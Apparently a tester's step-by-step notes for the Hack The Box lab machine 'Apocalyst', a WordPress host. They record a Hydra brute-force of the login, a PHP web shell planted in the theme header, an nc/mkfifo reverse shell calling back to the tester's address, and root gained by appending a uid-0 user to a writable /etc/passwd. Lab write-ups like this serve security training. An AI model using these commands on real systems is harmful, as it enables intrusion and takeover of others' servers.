@@ -1,0 +1,226 @@
+Machine-Name   :  Apocalyst
+IP-Address     :  10.129.60.225
+
+
+Command-Line: sudo nmap -A 10.129.60.225
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 00:59 EST
+    Nmap scan report for 10.129.60.225
+    Host is up (0.054s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
+    |   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
+    |_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
+    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+    |_http-generator: WordPress 4.8
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Apocalypse Preparation Blog
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=12/9%OT=22%CT=1%CU=39927%PV=Y%DS=2%DC=T%G=Y%TM=5FD067D
+    OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS
+    OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+    OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+    OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+    OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+    OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+    OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+    OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+    OS:=S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 1720/tcp)
+    HOP RTT      ADDRESS
+    1   55.72 ms 10.10.14.1
+    2   56.05 ms 10.129.60.225
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 28.08 seconds
+
+
+
+Command-Line: nano /etc/hosts
+Added-To-File: 10.129.60.225  apocalyst.htb
+
+Wappalyzer:
+    CMS
+      WordPress 4.8
+    Blogs
+      WordPress 4.8
+    Font scripts
+      Google Font API
+      Twitter Emoji (Twemoji)
+    Web servers
+      Apache 2.4.18
+    Programming languages
+      PHP
+    Operating systems
+      Ubuntu
+    Databases
+      MySQL
+    JavaScript libraries
+      jQuery 1.12.4
+      jQuery Migrate 1.4.1
+
+
+
+Command-Line: wpscan --url http://apocalyst.htb -e vt,tt,u,ap --log `pwd`/wp-scan.log
+Result: /home/kali/Desktop/HTB/Machines/Apocalyst_NF/wp-scan.log
+Notes: Found possible USERNAME: falaraki
+
+
+Command-Line: cewl -w `pwd`/cewl.txt http://apocalyst.htb
+Result: cewl.txt (wordlist)
+
+
+Command-Line: ./dirsearch.py -w ~/Desktop/HTB/Machines/Apocalyst_NF/cewl.txt -e php,txt -f -t 20 --include-status=200 -u http://10.129.60.225 | tee dirbuster-results.txt
+Result: /home/kali/Desktop/HTB/Machines/Apocalyst_NF/dirbuster-results.txt
+
+Notes: Most of the files are exactly 157B. Searching for files that differ by grepping the size of the files on each line and excluding all with "157".
+Command-Line: cat dirbuster-results.txt | grep -v '157'
+Result:
+    [01:43:35] Starting:
+        [01:43:42] 200 -  175B  - /Rightiousness/
+
+Browser: http://apocalyst.htb/Rightiousness/
+Browser: `Inspect-Element`
+Result:
+    <html lang="en"><head>
+      <body>
+        <img src="image.jpg">
+        <!-- needle -->
+      </body>
+    </html>
+
+Notes: It seems that we have found a "needle" in a "haystack".
+
+Notes: Downloading image.
+Image-Name: image.jpg
+
+Command-Line: sudo apt-get steghide
+Result: Installation Successful.
+
+
+Command-Line: steghide extract -sf image.jpg
+Result: /home/kali/Desktop/HTB/Machines/Apocalyst_NF/list.txt
+    *** BRUTE FORCE SUCCESSFUL ***
+Credentials-Found:
+    Username: falaraki, Password: Transclisiation
+
+Browser: http://apocalyst.htb/wp-login.php
+Result: WordPress Login Page.
+
+Notes: Entering in credentials 'admin/admin', then capturing using Burpsuite, and then sending to Repeater.
+
+Repeater: Copying "log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1"
+
+
+*** Brute-Force through Hydra Example. ***
+    Notes: Turned off Burpsuite Intercept. Entered credentials falaraki/admin. ERROR MESSAGE RETURNED.
+    Returned-Error-Message: "ERROR: The password you entered for the username falaraki is incorrect. Lost your password?"
+
+    Notes: "is incorrect" will be used to check against failed logins using Hydra. ^USER^ and ^PASS^ are specifically used to let Hydra know these are the parameters to target.
+
+    Command-line: hydra -l falaraki -P list.txt apocalyst.htb http-post-form "wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:is incorrect"
+    Result:
+        Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-11 18:36:30
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 486 login tries (l:1/p:486), ~31 tries per task
+        [DATA] attacking http-post-form://apocalyst.htb:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:is incorrect
+        [STATUS] 486.00 tries/min, 486 tries in 00:01h, 1 to do in 00:01h, 1 active
+        [STATUS] 243.00 tries/min, 486 tries in 00:02h, 1 to do in 00:01h, 1 active
+        [STATUS] 162.00 tries/min, 486 tries in 00:03h, 1 to do in 00:01h, 1 active
+        [STATUS] 121.50 tries/min, 486 tries in 00:04h, 1 to do in 00:01h, 1 active
+        [80][http-post-form] host: apocalyst.htb   login: falaraki   password: Transclisiation
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-11 18:40:30
+
+    Found-Credentials: "[80][http-post-form] host: apocalyst.htb   login: falaraki   password: Transclisiation"
+
+
+
+Notes: Logging in using credentials.
+Notes: Entering into Appearance/Editor/Theme Header (php)
+
+Notes: Adding reverse-shell code within php file.
+Php-Code: echo system($_REQUEST['cmd']);
+Browser: apocalyst.htb
+Actions: View-Source
+Browser: view-source:http://apocalyst.htb
+Browser-CMD: view-source:http://apocalyst.htb?cmd=ls
+Result: *** SUCCESSFUL ***
+
+Command-Line: nc -lvnp 6016
+Result:
+    listening on [any] 6016 ...
+
+Notes: Turned on Burpsuite. Intercepted from browser: view-source:http://apocalyst.htb?cmd=ls. Sent to Repeater. Changed "request method" (changed to "POST"). Changed 'cmd=ls' to 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.147 6016 >/tmp/f'. Highlighted 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.147 6016 >/tmp/f' and pressed `CTRL+u` to URL encode the 'cmd'.
+
+Final-Output: cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.147+6016+>/tmp/f
+
+Notes: Clicked "Send" in Repeater and accessed a reverse shell.
+
+*** REVERSE SHELL ACCESS ***
+
+Reverse-Shell: stty raw -echo
+Reverse-Shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result: www-data@apocalyst:/var/www/html/apocalyst.htb$
+
+www-data@apocalyst:/var/www/html/apocalyst.htb$ export TERM=linux
+www-data@apocalyst:/var/www/html/apocalyst.htb$ cd home/falaraki
+www-data@apocalyst:/var/www/html/apocalyst.htb$ cat user.txt
+Result: 9182d4d0b3f40307d86673193a9cd4e5
+    *** USER OWNED ***
+
+
+www-data@apocalyst:/var/www/html/apocalyst.htb$ cd /home/falaraki
+www-data@apocalyst:/home/falaraki$ ls -la
+Result:
+    total 44
+    drwxr-xr-x 4 falaraki falaraki 4096 Dec 24  2017 .
+    drwxr-xr-x 3 root     root     4096 Jul 26  2017 ..
+    -rw------- 1 falaraki falaraki    1 Dec 24  2017 .bash_history
+    -rw-r--r-- 1 falaraki falaraki  220 Jul 26  2017 .bash_logout
+    -rw-r--r-- 1 falaraki falaraki 3771 Jul 26  2017 .bashrc
+    drwx------ 2 falaraki falaraki 4096 Jul 26  2017 .cache
+    drwxrwxr-x 2 falaraki falaraki 4096 Jul 26  2017 .nano
+    -rw-r--r-- 1 falaraki falaraki  655 Jul 26  2017 .profile
+    -rw-rw-r-- 1 falaraki falaraki  109 Jul 26  2017 .secret
+    -rw-r--r-- 1 falaraki falaraki    0 Jul 26  2017 .sudo_as_admin_successful
+    -rw-r--r-- 1 root     root     1024 Jul 27  2017 .wp-config.php.swp
+    -r--r--r-- 1 falaraki falaraki   33 Jul 26  2017 user.txt
+
+
+www-data@apocalyst:/home/falaraki$ cat .secret
+Result: S2VlcCBmb3JnZXR0aW5nIHBhc3N3b3JkIHNvIHRoaXMgd2lsbCBrZWVwIGl0IHNhZmUhDQpZMHVBSU50RzM3VGlOZ1RIIXNVemVyc1A0c3M=
+Notes: Base64 encoded message.
+Base64-Decode:
+    Keep forgetting password so this will keep it safe!
+    Y0uAINtG37TiNgTH!sUzersP4ss
+
+Notes: Attempting ssh login for "falaraki" using password "Y0uAINtG37TiNgTH!sUzersP4ss"
+SSH-Login-Attempt: *** SUCCESSFUL ***
+
+
+falaraki@apocalyst:~$ cd /
+falaraki@apocalyst:/$ ls -la /etc/passwd
+Result: -rw-rw-rw- 1 root root 1637 Jul 26  2017 passwd
+Notes: /etc/passwd file is 'writable' by user and group.
+falaraki@apocalyst:/$ nano /etc/passwd
+Command-Line: openssl passwd -1 -salt uk47 hackthebox
+Result: $1$uk47$3tGwDoO91isdYlS1CSnLt.
+Appended-To-File: uk47:$1$uk47$3tGwDoO91isdYlS1CSnLt.:0:0:root:/root:/bin/bash
+falaraki@apocalyst:/$ su uk47
+Password: hackthebox
+    *** ROOT ACCESS GRANTED ***
+root@apocalyst:/etc# cat /root/root.txt
+Result: 1cb9d00f62d6015e07e58fa02caaf57f
+    *** ROOT OWNED ***
+
+      *** FINISHED ***
